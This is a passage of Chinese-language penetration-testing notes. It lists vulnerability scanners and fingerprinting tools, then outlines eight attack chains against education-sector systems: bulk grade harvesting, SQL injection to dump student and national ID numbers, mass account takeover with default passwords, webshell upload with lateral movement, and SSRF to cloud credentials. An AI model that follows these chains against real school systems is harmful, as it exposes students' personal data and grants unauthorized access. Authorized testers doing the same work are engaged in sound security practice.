  nuclei → 漏洞模板扫描
  httpx -td → 技术栈识别

漏洞挖掘:
  Burp Suite → 渗透测试核心
  sqlmap → SQL注入
  xray → 被动扫描
  dirsearch → 目录扫描

指纹识别:
  EHole(棱洞) → 教育系统指纹识别
  httpx -tech-detect
  whatweb
```

### 教育系统高危漏洞组合链
```
链1: 弱口令 → 成绩越权遍历 → 批量获取全校成绩
链2: Swagger泄露 → 发现未授权API → 批量获取学生信息
链3: SQL注入成绩接口 → 拖库 → 学号+身份证 → 登录统一认证
链4: 学号规律泄露 → 批量账号尝试默认密码 → 大量账号接管
链5: 选课系统并发 → 突破选课人数限制 → 免费选课
链6: 文件上传 → Webshell → 服务器权限 → 内网横向
链7: SSRF → 云元数据 → 云平台凭证 → 所有云资源访问
链8: Git泄露 → 源码/数据库配置 → 数据库连接 → 全部数据
```
